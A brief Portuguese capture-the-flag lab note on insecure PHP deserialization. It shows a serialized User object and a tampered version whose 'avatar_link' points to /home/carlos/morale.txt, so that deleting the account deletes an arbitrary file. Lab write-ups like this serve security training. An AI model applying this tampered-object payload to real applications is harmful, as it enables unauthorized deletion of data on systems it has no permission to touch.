#ctf 

A funcionalidade de deletar usuário também deleta o avatar do usuário, no diretório passado no `avatar_link`:

```PHP
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"niplrccj6ckd4uviyi58v89p3jzskh41";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

O objetivo do lab é deletar o arquivo `morale.txt` do diretório home de Carlos.

```PHP
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"niplrccj6ckd4uviyi58v89p3jzskh41";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```